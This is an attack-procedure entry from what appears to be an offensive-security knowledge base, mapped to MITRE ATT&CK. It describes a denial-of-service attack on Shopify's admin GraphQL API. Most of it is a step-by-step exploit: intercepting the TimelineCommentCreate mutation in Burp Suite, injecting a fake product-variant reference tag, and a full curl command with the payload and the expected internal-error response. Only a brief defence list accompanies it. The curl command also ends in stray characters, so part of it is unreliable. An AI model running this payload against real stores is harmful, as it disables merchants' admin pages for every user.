---
id: proc-shopify-intercept-001
tags:
  - shopify
  - graphql
  - intercept
  - modify
  - burp-suite
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/shopify-timeline-comment-create-malicious]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:45.060Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# Intercept-and-Modify-GraphQL-Timeline-Comment-Create

## Summary

This procedure intercepts the GraphQL TimelineCommentCreate mutation using Burp Suite, modifies the message to include a reference to a non-existent product variant, and sends it to trigger an internal exception that disables the timeline.

## Description

The Shopify GraphQL API lacks validation for special reference tags in comment messages. By injecting '[#V12221027811351| ]' (referencing a fake variant ID), the system throws an unhandled exception during rendering, hiding the entire timeline section and causing direct page load errors. This affects all users and persists until mitigated.

## Requirements

1. Burp Suite proxy configured in browser
2. Valid staff login (admin2)
3. Target discount code ID from setup
4. Access to Shopify admin GraphQL endpoint

## Defense

Defensive measures and detection strategies:

- Validate and sanitize comment inputs for invalid references
- Log GraphQL mutations with error details
- Monitor for internal errors in API responses
- Implement rate limiting on comment creations

## Objectives

1. Intercept and alter the comment creation request
2. Trigger exception via invalid product variant reference
3. Confirm internal error without user-facing validation failure

## Instructions

### Step 1: Navigate and Intercept Request

**Context**: Log in as admin2, go to the discount code, start adding a comment to trigger the GraphQL POST.

Configure Burp Suite to intercept, navigate to the page, and begin comment submission.

**Expected Output**: POST request to /admin/api/.../graphql.json intercepted.

### Step 2: Modify Message Parameter

**Context**: Edit the JSON payload's variables.input.message to the malicious value and update resourceId if needed.

In Burp Repeater or Proxy, change message to "[#V12221027811351| ]" and ensure resourceId is correct (e.g., "gid://shopify/PriceRule/298300342294").

**Expected Output**: Modified request ready for forwarding.

### Step 3: Forward and Observe Response

**Context**: Send the altered request to execute the mutation.

Forward the request in Burp. Execute [[commands/shopify-timeline-comment-create-malicious]] for curl simulation:

```bash
curl -X POST https://your-shop.myshopify.com/admin/api/2023-10/graphql.json -H 'Content-Type: application/json' -H 'X-Shopify-Access-Token: your-token' -d '{"operationName":"TimelineCommentCreate","variables":{"input":{"message":"[#V12221027811351| ]","resourceId":"gid://shopify/PriceRule/298300342294","attachments":[]}},"query":"mutation TimelineCommentCreate($input: TimelineCommentCreateInput!) { timelineCommentCreate(input: $input) { event { ...TimelineEvent __typename } userErrors { field message __typename } __typename } } fragment TimelineEvent on Event { id createdAt message ... on BasicEvent { attributeToApp attributeToUser __typename } ... on CommentEvent { rawMessage edited author { id name initials avatar(fallback: NOT_FOUND) { transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3) __typename } __typename } attachments { id image { transformedSrc(maxWidth: 50, maxHeight: 54, scale: 3) __typename } fileExtension size name url __typename } embed { ... on Product { id title featuredImage { altText transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3) __typename } tracksInventory totalInventory variants(first: 1) { edges { node { price __typename } __typename } __typename } __typename } ... on ProductVariant { id title image { altText transformedSrc(maxWidth: 50, maxHeight: 50, scale: 3) __typename } product { title __typename } inventoryQuantity inventoryItem { tracked __typename } __typename } ... on Customer { id displayName email ordersCount totalSpentV2 { amount currencyCode __typename } phone note __typename } ... on Order { id name createdAt totalPriceSet { shopMoney { amount currencyCode __typename } __typename } customer { id displayName __typename } lineItems(first: 250) { edges { node { id title product { id __typename } variant { id __typename } __typename } __typename } __typename } displayFinancialStatus displayFulfillmentStatus __typename } ... on DraftOrder { id name createdAt totalPrice customer { id displayName __typename } lineItems(first: 250) { edges { node { id title product { id __typename } variant { id __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename }'}'
```

> This command sends the malicious mutation; expect an internal error response indicating the exception.

**Expected Output**: {"errors":[{"message":"Internal error. Looks like something went wrong on our end.\nRequest ID: d8358e69-631c-45a7-929b-630b9abf8b5c (include this in support requests)."}]}

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/shopify-timeline-comment-create-malicious]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- graphql
- exploit
- dos
